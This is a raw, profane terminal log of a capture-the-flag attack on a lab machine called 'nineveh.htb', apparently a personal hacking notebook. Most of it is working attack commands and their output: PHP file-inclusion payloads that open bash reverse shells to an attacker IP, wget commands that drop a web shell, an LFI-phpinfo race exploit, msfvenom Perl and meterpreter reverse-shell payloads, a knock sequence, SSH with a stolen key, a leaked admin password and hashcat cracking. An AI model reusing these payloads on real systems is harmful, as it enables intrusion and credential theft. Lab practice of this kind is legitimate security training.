backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin


15:59:36-cdowns@7242-alpha-reticuli:~/Github$ git clone https://github.com/Alamot/code-snippets.git
Cloning into 'code-snippets'...
remote: Counting objects: 332, done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 332 (delta 20), reused 47 (delta 13), pack-reused 275
Receiving objects: 100% (332/332), 744.47 KiB | 4.23 MiB/s, done.
Resolving deltas: 100% (121/121), done.
16:00:09-cdowns@7242-alpha-reticuli:~/Github$

Fuck it... Kadiumus and do it by hand. RACE THIS BITCH OUT --


16:19:25-cdowns@7242-alpha-reticuli:~/Github/Kadimus$ export USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
16:19:29-cdowns@7242-alpha-reticuli:~/Github/Kadimus$ export COOKIE="PHPSESSIDnut1bnt4f9p57p5f31i2eod042"
16:19:34-cdowns@7242-alpha-reticuli:~/Github/Kadimus$ for i in {1..100} ; do ./kadimus -t http://nineveh.htb/department/manage.php?notes=php://input%00 -C \ '<?php echo shell_exec("bash -i >& /dev/tcp/192.168.0.10/31337 0>&1 2>&1"); ?>' -X input -B $COOKIE -A $USER_AGENT ; done
Not Working !!!

From FireFox --
POST http://nineveh.htb/department/manage.php?notes=php://input <? system('wget https://192.168.1.116/r_shell.php -O /var/www/r_shell.php --no-check-certificate');?>
POST http://nineveh.htb/department/manage.php?notes=php://input <? system('wget https://192.168.0.10/r_shell.php -O /var/www/r_shell.php --no-check-certificate');?>
Not Working !!!

18:29:08-cdowns@7242-alpha-reticuli:~/Github/code-snippets/hacking$ for i in {1..55} ; do python2 lfiphpinfo.py nineveh.htb 80 10 ; done

BOOCKED BY FUCKING FIREWALL !!!!
Jun 23 18:28:09 7242-alpha-reticuli kernel: [ 7097.852653] [UFW BLOCK] IN=wlan0 OUT= MAC=00:e1:8c:dc:08:bb:08:00:27:2e:f9:b5:08:00 SRC=192.168.0.150 DST=192.168.0.10 LEN=2357 TOS=0x00 PREC=0x00 TTL=64 ID=40361 DF PROTO=TCP SPT=80 DPT=51036 WINDOW=704 RES=0x00 ACK PSH URGP=0 
Jun 23 18:28:09 7242-alpha-reticuli kernel: [ 7097.852742] [UFW BLOCK] IN=wlan0 OUT= MAC=00:e1:8c:dc:08:bb:08:00:27:2e:f9:b5:08:00 SRC=192.168.0.150 DST=192.168.0.10 LEN=65 TOS=0x00 PREC=0x00 TTL=64 ID=40363 DF PROTO=TCP SPT=80 DPT=51036 WINDOW=704 RES=0x00 ACK PSH URGP=0 
Jun 23 18:28:09 7242-alpha-reticuli kernel: [ 7097.852817] [UFW BLOCK] IN=wlan0 OUT= MAC=00:e1:8c:dc:08:bb:08:00:27:2e:f9:b5:08:00 SRC=192.168.0.150 DST=192.168.0.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=40364 DF PROTO=TCP SPT=80 DPT=51036 WINDOW=704 RES=0x00 ACK FIN URGP=0 
root@7242-alpha-reticuli:/var/log#

root@7242-alpha-reticuli:~# iptables -nL
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
root@7242-alpha-reticuli:~# 

Try this whore again --
Run until we get a god damn shell !!! ---
POST Auth --
-- Insert PHPSESSID --

18:38:43-cdowns@7242-alpha-reticuli:~/Github/code-snippets/hacking$ for i in {1..55} ; do python2 lfiphpinfo.py nineveh.htb 80 10 ; done
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 125172
Spawning worker pool (10)...
 1000 /  1000
:(
Shuttin' down...
LFI With PHPInfo()
------- snip -------

14:02:34-cdowns@7242-alpha-reticuli:~/Github/code-snippets/hacking$ cat lfiphpinfo.py | egrep "HOST|PORT|PHPSES"
LHOST="192.168.0.10"
LPORT=31337
    PAYLOAD="""Security Test\r<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"""+str(LHOST)+"""/"""+str(LPORT)+""" 0>&1'\");?>\r"""
Cookie: PHPSESSID=n6htbp4u1crkg06j4e7bdmi170; othercookie="""+padding+"""\r
Cookie: PHPSESSID=n6htbp4u1crkg06j4e7bdmi170\r
14:02:49-cdowns@7242-alpha-reticuli:~/Github/code-snippets/hacking$ for i in {1..5} ; do python2 lfiphpinfo.py nineveh.htb 80 10 ; done
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 125177
Spawning worker pool (10)...
  25 /  1000

Terminal ---

root@7242-alpha-reticuli:~# nc -nlvp 31337
listening on [any] 31337 ...
connect to [192.168.0.10] from (UNKNOWN) [192.168.0.150] 50774
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id ; echo $SHELL ; echo $PATH
id ; echo $SHELL ; echo $PATH
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/usr/sbin/nologin
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@nineveh:/var/www/html/department$
www-data@nineveh:/var/www/html/department$ cat login.php | egrep "USER|PASS"
cat login.php | egrep "USER|PASS"
$USER = 'admin';
$PASS = '1q2w3e4r5t';
	if($_POST['username'] == $USER){
		if(strcmp($_POST['password'], $PASS ) == 0){
			$_SESSION['username'] = $USER;
www-data@nineveh:/var/www/html/department$ 


Move ssh keys to /tmp/
mkdir .ssh/ ; cd /tmp/.ssh ; tar -xvf nineveh.tar

RESET $HOME --
vim
<esc> :!/bin/bash
export HOME=/tmp
eval `ssh-agent`
ssh-add


www-data@nineveh:/var/www/html/department$ find / -user amrois -exec ls -l {} \; 2>/dev/null
<tml/department$ find / -user amrois -exec ls -l {} \; 2>/dev/null           
total 4
-rw------- 1 amrois amrois 33 Jul  2  2017 user.txt
-rw-r--r-- 1 amrois amrois 220 Jul  2  2017 /home/amrois/.bash_logout
-rw------- 1 amrois amrois 0 Jul  2  2017 /home/amrois/.bash_history
-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 /home/amrois/.bashrc
-rw-r--r-- 1 amrois amrois 655 Jul  2  2017 /home/amrois/.profile
total 4
-rw------- 1 amrois amrois 400 Jul  2  2017 authorized_keys
-rw------- 1 amrois amrois 400 Jul  2  2017 /home/amrois/.ssh/authorized_keys
-rw------- 1 amrois amrois 33 Jul  2  2017 /home/amrois/user.txt
total 80
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:50 report-18-06-24:14:50.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:51 report-18-06-24:14:51.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:52 report-18-06-24:14:52.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:53 report-18-06-24:14:53.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:54 report-18-06-24:14:54.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:55 report-18-06-24:14:55.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:56 report-18-06-24:14:56.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:57 report-18-06-24:14:57.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:58 report-18-06-24:14:58.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:59 report-18-06-24:14:59.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:52 /report/report-18-06-24:14:52.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:59 /report/report-18-06-24:14:59.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:56 /report/report-18-06-24:14:56.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:55 /report/report-18-06-24:14:55.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:50 /report/report-18-06-24:14:50.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:51 /report/report-18-06-24:14:51.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:57 /report/report-18-06-24:14:57.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:58 /report/report-18-06-24:14:58.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:54 /report/report-18-06-24:14:54.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 24 14:53 /report/report-18-06-24:14:53.txt
-rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh
-rw-r--r-- 1 amrois mail 483 Jul  2  2017 /var/mail/amrois
www-data@nineveh:/var/www/html/department$ 



root@7242-alpha-reticuli:~# nc -nlvp 31337
listening on [any] 31337 ...
connect to [192.168.0.10] from (UNKNOWN) [192.168.0.150] 51072
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ ^Z
[1]+  Stopped                 nc -nlvp 31337
root@7242-alpha-reticuli:~# stty -a
speed 38400 baud; rows 52; columns 191; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@7242-alpha-reticuli:~# stty raw -echo 
root@7242-alpha-reticuli:~# 

FUCK !! KNOCKD IS RUNNING ---
root      1131     1  3 Jun23 ?        00:40:46 /usr/sbin/knockd -d -i eth0


16:24:43-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ strings ninevehForAll.png 
IHDR
sBIT
tEXtSoftware
Shutterc
IDATx
4! @ (
GVVex
^^Tg
r0eqQ
*CDD
76q~
----- snip -----

Goto --
http://shutter-project.org
BROKEN !!!!!!
NEXT ---


17:09:58-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ identify -verbose nineveh.png 
Image: nineveh.png
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 1497x746+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianess: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 1116762
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 168.965 (0.662608)
      standard deviation: 60.0987 (0.235681)
      kurtosis: -0.212535
      skewness: -0.640186
      entropy: 0.960483
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 140.427 (0.550694)
      standard deviation: 58.1568 (0.228066)
      kurtosis: -0.517794
      skewness: -0.249571
      entropy: 0.969842
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 105.569 (0.413996)
      standard deviation: 58.2911 (0.228593)
      kurtosis: -0.696599
      skewness: 0.276453
      entropy: 0.969319
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 138.32 (0.542433)
      standard deviation: 58.8489 (0.23078)
      kurtosis: -0.835681
      skewness: -0.150461
      entropy: 0.966548
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 1497x746+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2018-06-24T09:18:10-05:00
    date:modify: 2018-06-24T09:18:10-05:00
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 1497, 746
    png:sRGB: intent=0 (Perceptual Intent)
    png:text: 1 tEXt/zTXt/iTXt chunks were found
    signature: 1b8032df3e336964c6ac3bb03873c2c747bedf3361e5d7287087cfc262f1e65f
    Software: Shutter
  Artifacts:
    filename: nineveh.png
    verbose: true
  Tainted: False
  Filesize: 2.75801MiB
  Number pixels: 1.11676M
  Pixels per second: 27.9191MB
  User time: 0.030u
  Elapsed time: 0:01.039
  Version: ImageMagick 6.9.9-34 Q16 x86_64 20180122 http://www.imagemagick.org
17:11:17-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$


PNG-ITXT --
https://github.com/finnp/png-itxt.git
Requires --
https://www.dotnetjalps.com/2018/02/install-nodejs-and-npm-on-debian.html
https://docs.npmjs.com/getting-started/using-a-package.json

17:20:52-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ pnginfo /home/cdowns/Documents/Vulnhub/nineveh.png
/home/cdowns/Documents/Vulnhub/nineveh.png...
  Image Width: 1497 Image Length: 746
  Bitdepth (Bits/Sample): 8
  Channels (Samples/Pixel): 3
  Pixel depth (Pixel Depth): 24
  Colour Type (Photometric Interpretation): RGB 
  Image filter: Single row per byte filter 
  Interlacing: No interlacing 
  Compression Scheme: Deflate method 8, 32k window
  Resolution: 0, 0 (unit unknown)
  FillOrder: msb-to-lsb
  Byte Order: Network (Big Endian)
  Number of text strings: 1
    Software (xTXt deflate compressed): Shutter

17:27:44-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ 

19:49:55-cdowns@7242-alpha-reticuli:~/Github/png-itxt$ npm install
audited 1742 packages in 2.625s
found 7 vulnerabilities (4 low, 1 moderate, 2 high)
  run `npm audit fix` to fix them, or `npm audit` for details
19:50:01-cdowns@7242-alpha-reticuli:~/Github/png-itxt$ npm audit fix
up to date in 1.764s
fixed 0 of 7 vulnerabilities in 1742 scanned packages
  2 package updates for 7 vulns involved breaking changes
  (use `npm audit fix --force` to install breaking changes; or do it by hand)
19:50:10-cdowns@7242-alpha-reticuli:~/Github/png-itxt$ 
19:47:42-cdowns@7242-alpha-reticuli:~/Github/png-itxt$ ls -al node_modules/
------ snip ------

TRYING TO GET THE DATA OUT ---

19:52:05-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ ./png-itxt get -k wwwwwwwwwwwww2z -f tEXt,zTXt,iTXt /home/cdowns/Documents/Vulnhub/nineveh.png -o /tmp/nineveh.out
19:53:05-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ cat /tmp/nineveh.out 
19:53:07-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ ./png-itxt get -k wwwwwwwwwwwww2z -f tEXt /home/cdowns/Documents/Vulnhub/nineveh.png -o /tmp/nineveh.out
19:54:00-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ cat /tmp/nineveh.out 
19:54:02-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ ./png-itxt get -k wwwwwwwwwwwww2z -f zTXt /home/cdowns/Documents/Vulnhub/nineveh.png -o /tmp/nineveh.out
19:54:15-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ cat /tmp/nineveh.out 
19:54:16-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ ./png-itxt get -k wwwwwwwwwwwww2z -f iTXt /home/cdowns/Documents/Vulnhub/nineveh.png -o /tmp/nineveh.out
19:54:25-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ cat /tmp/nineveh.out 
19:54:27-cdowns@7242-alpha-reticuli:~/Github/png-itxt/bin$ 


Attempt to Upgrade Rev Shell --
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

root@7242-alpha-reticuli:/var/www/html# msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.10 LPORT=31336 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 232 bytes
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.0.10:31336");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
root@7242-alpha-reticuli:/var/www/html# 

PFFFFT JUNKZ --

Out of Curiousity --

root@7242-alpha-reticuli:/var/www/html# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=31338 -b 00 -f elf > r_shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=56, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 175 (iteration=0)
x64/xor chosen with final size 175
Payload size: 175 bytes
Final size of elf file: 295 bytes

root@7242-alpha-reticuli:/var/www/html# chown -R www-data:www-data r_shell.elf 
root@7242-alpha-reticuli:/var/www/html# file r_shell.elf 
r_shell.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, corrupted section header size
root@7242-alpha-reticuli:/var/www/html#


root@7242-alpha-reticuli:~# msfconsole -q -x "use exploit/multi/handler; set LHOST 192.168.0.10; set LPORT 31338; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set ExitOnSession false ; exploit -j -z"
LHOST => 192.168.0.10
LPORT => 31338
PAYLOAD => linux/x64/meterpreter/reverse_tcp
ExitOnSession => false
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.0.10:31338 
msf exploit(multi/handler) > [*] Sending stage (812100 bytes) to 192.168.0.150
[*] Meterpreter session 1 opened (192.168.0.10:31338 -> 192.168.0.150:47964) at 2018-06-25 08:03:56 -0500
sessions 1
[*] Starting interaction with 1...

meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > search recon

Matching Modules
================

   Name                                              Disclosure Date  Rank       Description
   ----                                              ---------------  ----       -----------
   auxiliary/admin/hp/hp_ilo_create_admin_account    2017-08-24       normal     HP iLO 4 1.00-2.50 Authentication Bypass Administrator Account Creation
   exploit/linux/http/pineapple_bypass_cmdinject     2015-08-01       excellent  Hak5 WiFi Pineapple Preconfiguration Command Injection
   exploit/linux/http/pineapple_preconfig_cmdinject  2015-08-01       excellent  Hak5 WiFi Pineapple Preconfiguration Command Injection
   exploit/windows/misc/hp_operations_agent_coda_34  2012-07-09       normal     HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow
   exploit/windows/misc/hp_operations_agent_coda_8c  2012-07-09       normal     HP Operations Agent Opcode coda.exe 0x8c Buffer Overflow
   post/multi/recon/local_exploit_suggester                           normal     Multi Recon Local Exploit Suggester
   post/multi/recon/multiport_egress_traffic                          normal     Generate TCP/UDP Outbound Traffic On Multiple Ports
   post/multi/recon/sudo_commands                                     normal     Sudo Commands
   post/windows/gather/credentials/skype                              normal     Windows Gather Skype Saved Password Hash Extraction
   post/windows/recon/computer_browser_discovery                      normal     Windows Recon Computer Browser Discovery
   post/windows/recon/outbound_ports                                  normal     Windows Outbound-Filtering Rules
   post/windows/recon/resolve_ip                                      normal     Windows Recon Resolve IP


msf exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 192.168.0.150 - Collecting local exploits for x64/linux...
[*] 192.168.0.150 - 18 exploit checks are being tried...
[+] 192.168.0.150 - exploit/linux/local/bpf_priv_esc: The target appears to be vulnerable.
[+] 192.168.0.150 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
meterpreter > 

Back to the hardway --


FIND KNOCK SEQUENCE ---
www-data@nineveh:/tmp$ ls -l /etc/knockd.conf
ls -l /etc/knockd.conf
-rw-r----- 1 root root 335 Jul  2  2017 /etc/knockd.conf
www-data@nineveh:/tmp$ find / -user amrois -type f 2>/dev/null
find / -user amrois -type f 2>/dev/null
/home/amrois/.bash_logout
/home/amrois/.bash_history
/home/amrois/.bashrc
/home/amrois/.profile
/home/amrois/.ssh/authorized_keys
/home/amrois/user.txt
/report/report-18-06-25:12:05.txt
/report/report-18-06-25:12:00.txt
/report/report-18-06-25:12:03.txt
/report/report-18-06-25:12:01.txt
/report/report-18-06-25:12:04.txt
/report/report-18-06-25:12:02.txt
/report/report-18-06-25:12:06.txt
/usr/sbin/report-reset.sh
/var/mail/amrois
www-data@nineveh:/tmp$ cat /var/mail/amrois
cat /var/mail/amrois
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911



www-data@nineveh:/tmp$ 


12:08:26-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat Unlock_Nineveh.sh 
#!/bin/bash
 
# https://github.com/jvinet/knock
# Compile and install from github

host="nineveh.htb"
cmd="/usr/local/bin/knock -v -d 100 $host"  

# ports --
A="571:tcp"
B="290:tcp"
C="911:tcp"

# run this bitch --
for i in $A $B $C; do $cmd $i; done
#for i in $A $C $B; do $cmd $i; done
#for i in $B $A $C; do $cmd $i; done
#for i in $B $C $A; do $cmd $i; done
#for i in $C $A $B; do $cmd $i; done
#for i in $C $B $A; do $cmd $i; done

echo "[+] knock: Finished --"
echo "[+] nmap: Scanning for ports --"

#root@7242-alpha-reticuli:~# nmap -Pn -sT pinkydb -p-
#Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 14:13 CDT
#Nmap scan report for pinkydb (192.168.1.119)
#Host is up (0.0049s latency).
#rDNS record for 192.168.1.119: pinkys-palace.attlocal.net
#Not shown: 65531 closed ports
#PORT      STATE    SERVICE
#80/tcp    open     http
#4655/tcp  filtered unknown
#7654/tcp  filtered unknown
#31337/tcp filtered Elite

#Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
#root@7242-alpha-reticuli:~# 

# We know the ports now !!!!

/usr/bin/nmap -Pn -sT -p 22 $host 
echo "[+] nmap: Finished --"
12:08:41-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ ./Unlock_Nineveh.sh 
hitting tcp 192.168.0.150:571
hitting tcp 192.168.0.150:290
hitting tcp 192.168.0.150:911
[+] knock: Finished --
[+] nmap: Scanning for ports --
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 12:08 CDT
Nmap scan report for nineveh.htb (192.168.0.150)
Host is up (0.00026s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
[+] nmap: Finished --
12:08:45-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$

Connect as AMROIS --

12:10:09-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub/secret$ ssh -p 22 -i nineveh.priv amrois@nineveh.htb
The authenticity of host 'nineveh.htb (192.168.0.150)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'nineveh.htb,192.168.0.150' (ECDSA) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

177 packages can be updated.
95 updates are security updates.


You have mail.
Last login: Sun Dec 31 20:12:59 2017 from 192.168.0.200
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ cat /home/amrois/user.txt
82a864f9eec2a76c166ec7b1078ca6c8
amrois@nineveh:~$ ls -l /usr/sbin/report-reset.sh
-rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh
amrois@nineveh:~$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
amrois@nineveh:~$

What is this ? Passwd ??? --
http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

amrois@nineveh:/tmp$ cat $HOME/user.txt
82a864f9eec2a76c166ec7b1078ca6c8
amrois@nineveh:/tmp$ 

root@7242-alpha-reticuli:~/Downloads/package# HASH="82a864f9eec2a76c166ec7b1078ca6c8"
root@7242-alpha-reticuli:~/Downloads/package# echo -n $HASH | wc -c
32
root@7242-alpha-reticuli:~/Downloads/package# hashid $HASH 
Analyzing '82a864f9eec2a76c166ec7b1078ca6c8'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
root@7242-alpha-reticuli:~/Downloads/package# 

root@7242-alpha-reticuli:/tmp# hashcat -a 0 -m 0 /home/cdowns/Documents/Vulnhub/nineveh_user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force -O
hashcat (v4.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 8192/30002 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 30000

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
* Device #1: Kernel m00000_a0-optimized.bdaebce3.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344415
* Bytes.....: 139921784
* Keyspace..: 430332450000

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 

BACK TO ---

amrois@nineveh:~$ find / -user amrois -type f 2>/dev/null
/home/amrois/.bash_logout
/home/amrois/.bash_history
/home/amrois/.bashrc
/home/amrois/.cache/motd.legal-displayed
/home/amrois/.lesshst
/home/amrois/.profile
/home/amrois/.ssh/authorized_keys
/home/amrois/user.txt
/home/amrois/.viminfo
----- snip ------
/report/report-18-06-25:20:32.txt
/report/report-18-06-25:20:30.txt
/report/report-18-06-25:20:31.txt
/usr/sbin/report-reset.sh


amrois@nineveh:~$ ls -l /report/
total 64
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:30 report-18-06-25:20:30.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:31 report-18-06-25:20:31.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:32 report-18-06-25:20:32.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:33 report-18-06-25:20:33.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:34 report-18-06-25:20:34.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:35 report-18-06-25:20:35.txt
-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:36 report-18-06-25:20:36.txt
